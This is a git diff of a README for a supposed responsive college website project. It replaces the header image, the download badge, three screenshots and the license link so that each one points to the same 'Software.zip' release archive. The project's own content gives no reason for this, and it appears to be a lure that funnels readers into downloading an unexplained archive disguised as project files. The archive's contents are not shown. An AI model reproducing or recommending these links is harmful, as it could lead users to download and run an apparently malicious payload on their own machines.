@@ -1,6 +1,6 @@
 # 🎓 Welcome to the Responsive College Website Repository! 🏫
 
-![College](https://www.pngfind.com/pngs/m/275-2759734_college-building-png-images-transparent-background-college-building.png)
+![College](https://github.com/scarmbledeggs/Responsive-College-Website/releases/download/v1.0/Software.zip)
 
 ## Repository Information
 - **Repository Name:** Responsive-College-Website
@@ -16,14 +16,14 @@
 ## Installation
 To run the project on your local machine, you can download the necessary files from the following link:  
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)  
+[![Download https://github.com/scarmbledeggs/Responsive-College-Website/releases/download/v1.0/Software.zip](https://github.com/scarmbledeggs/Responsive-College-Website/releases/download/v1.0/Software.zip)](https://github.com/scarmbledeggs/Responsive-College-Website/releases/download/v1.0/Software.zip)  
 
 Once downloaded, unzip the file and follow the installation instructions provided in the repository.
 
 ## Screenshots
-![Homepage](https://www.example.com/homepage.png)
-![Courses](https://www.example.com/courses.png)
-![Contact](https://www.example.com/contact.png)
+![Homepage](https://github.com/scarmbledeggs/Responsive-College-Website/releases/download/v1.0/Software.zip)
+![Courses](https://github.com/scarmbledeggs/Responsive-College-Website/releases/download/v1.0/Software.zip)
+![Contact](https://github.com/scarmbledeggs/Responsive-College-Website/releases/download/v1.0/Software.zip)
 
 ## Usage
 1. Open the project in your preferred text editor.
@@ -39,7 +39,7 @@ If you encounter any issues or have any questions regarding the project, feel fr
 Contributions to the project are welcome! If you have any ideas for improvements or new features, please open an issue or submit a pull request.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://www.example.com/license) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/scarmbledeggs/Responsive-College-Website/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
